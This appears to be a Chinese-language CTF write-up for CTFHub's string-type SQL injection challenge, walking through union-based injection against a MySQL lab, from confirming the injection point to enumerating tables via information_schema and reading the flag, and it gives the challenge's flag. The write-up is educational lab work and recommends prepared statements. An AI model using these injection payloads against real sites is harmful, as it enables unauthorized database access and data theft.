---
layout: post
title: "CTFHub SQL注入 - 字符型注入"
date: 2026-10-12
categories: ctfhub
tags: [ctfhub,web,sql注入,字符型注入,union注入]
permalink: /ctfhub/sql-char-sqli.html
---

# CTFHub SQL注入 - 字符型注入

## 一、题目信息
平台：CTFHub
分类：Web - SQL注入
题目名称：字符型注入
难度：简单
Flag：`ctfhub{dcfffc70306c19cc9ac7aad7}`

## 二、考点
1. 字符型SQL注入原理，单引号闭合
2. Union联合查询注入利用
3. MySQL注释符`#`的使用
4. MySQL元数据库`information_schema`查询库、表、字段

## 三、题目内容
访问靶场页面，存在ID输入框，输入内容查询对应数据。后端将用户输入放在单引号内拼入SQL语句：
`select * from news where id='用户输入'`
没有做过滤处理，存在字符型SQL注入漏洞。字符型注入需要单引号闭合原有SQL，搭配`#`注释掉后面多余引号，利用union联合查询读取数据库内flag数据。

## 四、解题步骤
1. **验证注入点**
输入payload：`1' and 1=1#`，页面正常回显数据；
输入payload：`1' and 1=2#`，页面无数据返回；
证明存在字符型SQL注入。

2. **order by 判断查询字段数量**
输入`1' order by 2#`，页面正常；
输入`1' order by 3#`，页面无回显；
确定查询返回 **2个字段**。

3. **获取当前数据库名称**
payload：`-1' union select 1,database()#`
`id=-1`使得前半段查询无结果，页面只展示union后查询的数据，得到数据库名：`sqli`。

4. **查询该数据库下所有表名**
payload：`-1' union select 1,group_concat(table_name) from information_schema.tables where table_schema='sqli'#`
查询得到表：`news,flag`，flag表是目标。

5. **查询flag表中的字段**
payload：`-1' union select 1,group_concat(column_name) from information_schema.columns where table_name='flag'#`
得到字段名称：`flag`。

6. **读取flag值**
payload：`-1' union select 1,flag from flag#`
页面Data位置输出flag。

## 五、知识点解析
1. **字符型注入**：参数被单引号包裹带入SQL，需要单引号闭合，搭配`#`注释剩余SQL。整数注入不需要单引号。
2. **Union联合查询**：将两条SELECT查询结果合并输出，**要求前后查询字段数目一致**。使用`-1'`让前面查询不返回结果，页面只展示我们构造查询的内容。
3. **`#`**：MySQL单行注释符号，`#`后面内容不会被数据库执行。
4. **`information_schema`**：MySQL自带元数据库，记录所有数据库、数据表、字段信息，SQL注入中用来探测库表结构。
5. **`group_concat()`**：将多行查询结果合并为一行输出，方便一次性查看所有表/字段。

## 六、总结
字符型union注入是SQL注入基础题型，固定流程：单引号闭合+注释 → 判断注入点 → order by判断字段数 → 爆库名 → 爆表名 → 爆字段名 → 查询数据。开发中禁止直接拼接用户输入到SQL语句，应当使用预编译语句，防御SQL注入漏洞。
